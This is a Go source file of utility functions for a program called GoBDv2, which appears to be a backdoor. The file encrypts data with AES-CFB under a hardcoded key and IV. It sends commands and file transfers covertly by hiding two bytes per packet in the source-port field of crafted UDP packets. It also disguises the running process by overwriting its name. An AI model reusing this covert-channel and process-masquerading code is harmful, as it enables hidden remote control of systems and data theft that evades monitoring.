package main
/* utility.go
PROGRAM: GoBDv2 Final
AUTHOR: Ramzi Chennafi
DATE: November 18 2015
FUNCTIONS:
     intiateTools()
     encrypt_data([]byte) []byte
     decrypt_data([]byte) []byte
     sendEncryptedData(uint16, string, string, []byte)
     craftPacket([]byte, string, uint16, []byte) []byte
     GetLocalMAC(string) net.HardwareAddr
     GetLocalIP() net.IP
     checkError(error)
     SetProcessName(string) error

ABOUT:
     Contains all utility functions for the GoBD program, this includes packet crafting, encryption error checking
     and internal commands.
*/
import(
	"reflect"
	"unsafe"
	"encoding/binary"
	"bytes"
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket"
	"net"
	"os"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
)
var iv []byte;
var block cipher.Block;
/* 
    FUNCTION: func intiateTools()
    RETURNS: Nothing

    ABOUT:
    Intiates the the iv and the cipher block for encryption and decryption. Not the 
    most cryptographily secure, replace with random key/IV generation or your own key/IV to improve.
*/
func intiateTools(){

	keytext := (([]byte)("s92jmc912hfye>p[c620cmi:pqinuysh"));
	block, _ = aes.NewCipher(keytext);
	ciphercode, _ := hex.DecodeString("a09c2cb3d389f6901176cbbd5ba9535f87f4f1532325bc9ecf336bb209073e7725f0a21255ab4cdf97a3a74ad0286b6d637145476af6dd740bad9214912f79de66190aef6e7a6789f46be6bf654286bf17c53a1d8c399ccdd4c59ac1c1df108709cc7690");
	iv = ciphercode[:aes.BlockSize];
}
/* 
    FUNCTION: encrypt_data(data []byte) []byte
    RETURNS: []byte, the encrypted data
    ARGUMENTS: 
   1             string data - the data to encrypt

    ABOUT:
    Encrypts data using the programs specified algorithm. Returns the encrypted data.
*/
func encrypt_data(data []byte) []byte {
	
	cfb := cipher.NewCFBEncrypter(block, iv);
	ciphertext := make([]byte, len(data));
	cfb.XORKeyStream(ciphertext, data);

	return ciphertext;
}
/* 
    FUNCTION: decrypt_data(data []byte) []byte
    RETURNS: []byte, the decrypted data
    ARGUMENTS: 
                []byte data - the encrypted data to decrypt

    ABOUT:
    Decrypts data using the programs specified algorithm. Returns the decrypted data.
*/
func decrypt_data(data []byte) []byte {
	
	cfbdec := cipher.NewCFBDecrypter(block, iv);
	plaintextCopy := make([]byte, len(data));
	cfbdec.XORKeyStream(plaintextCopy, data);

	return plaintextCopy[:]
}
/* 
    FUNCTION: sendEncryptedData(port uint16, data, ip string, mode int)
    RETURNS: Nothing
    ARGUMENTS: 
                uint16 port - the port to send the data to
                string ip   - the ip to send the data to
                string data - the data to send 
                int mode    - the mode of the send, either CMD or FTRANSFER (command/file transfer)
    ABOUT:
    Sends encrypted data over UDP covertly to the specified ip and port. Sends a completetion packet after the end
    of any transfer.
*/
func sendEncryptedData(port uint16, data, ip string, mode int) {

	var tmpBuffer bytes.Buffer
	var buffer []byte
	tmp := encrypt_data([]byte(data))
	tmpBuffer.Write(tmp)
	
	if tmpBuffer.Len() % 2 != 0 {
		tmpBuffer.WriteByte(0)
	}

	size := tmpBuffer.Len()
	for p := 0; p <= size; p = p + 2 {
		
		if p == size && mode == CMD {
			temp := []byte{0, 0}
			buffer = craftPacket(temp, ip, SND_CMPLETE, []byte{});
		} else if  p == size && mode == FTRANSFER {
			temp := []byte{0,0}
			buffer = craftPacket(temp,ip, FSND_CMPLETE, []byte{});
		} else {
			temp := tmpBuffer.Next(2)
			buffer = craftPacket(temp, ip, port, []byte{}); 
		}
		
		if buffer == nil { // if original query was invalid
			fmt.Print("Buffer error, returned nil.\n")
			continue
		}

		err := handle.WritePacketData(buffer);
		checkError(err)
	}
}
/* 
    FUNCTION: craftPacket(data []byte, ip string, port uint16, payload []byte) []byte
    RETURNS: []byte, byte array containing packet data created
    ARGUMENTS: 
              []byte data - data to be placed in the source port
              string ip   - address to place in the dst ip of the ip layer
              uint16 port - destination port of udp header
              []byte payload - udp payload to be passed in

    ABOUT:
    Crafts a packet with a IP, ethernet and UDP header. Covertly inserts data into
    the source port and appends the specified payload.
*/
func craftPacket(data []byte, ip string, port uint16, payload []byte) []byte {
	
	ethernetLayer := &layers.Ethernet{
		SrcMAC: localmac,
		DstMAC: destmac,
		EthernetType: layers.EthernetTypeIPv4,
	}
	
	ipLayer := &layers.IPv4{
		Version:    4,
		IHL:        5,
		TOS:        0,
		Length:     20,
		Id:         2,
		Flags:      layers.IPv4DontFragment,
		FragOffset: 0,
		TTL:        255,
		Protocol:   layers.IPProtocolUDP,
		Checksum:   0,
		SrcIP:      localip,
		DstIP:      net.ParseIP(ip),
	}

	val := binary.BigEndian.Uint16(data)
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(MAX_PORT - val), 
		DstPort: layers.UDPPort(port),
		Length: 16,
	}

	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err)
	
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload));
	checkError(err);

	return buf.Bytes()
}
/* 
    FUNCTION: func checkError(err error)
    RETURNS: Nothing
    ARGUMENTS: 
              err error : the error code to check

    ABOUT:
    Checks an error code, panics if the error is not nil.
*/
func checkError(err error){
	if err != nil {
		panic(err)
	}
}
/* 
    FUNCTION: func SetProcessName(name string) error
    RETURNS: err Error, if anything goes wrong
    ARGUMENTS: 
                string name: the new process name to set the program to

    ABOUT:
    Sets the process name of the GoBD program to name.
*/
func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}

/* 
    FUNCTION: func GetLocalIP() string
    RETURNS: String, the local ip 

    ABOUT:
    Grabs the local ip of the host system.
*/
func GetLocalIP() net.IP {
	addrs, err := net.InterfaceAddrs();
	checkError(err);
	
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP;
			}
		}
	}
	
	return nil;
}
/* 
    FUNCTION: GetLocalMAC(iface string) (macAddr net.HardwareAddr)
    RETURNS: net.HardwareAddr, the mac address of the specified iface
    ARGUMENTS: 
                string iface: the name of the interface to get the macaddress for

    ABOUT:
    Returns the mac address of the specified interface.
*/
func GetLocalMAC(iface string) (macAddr net.HardwareAddr){

	netInterface, err := net.InterfaceByName(iface)
	checkError(err)

	macAddr = netInterface.HardwareAddr
	return macAddr;
}
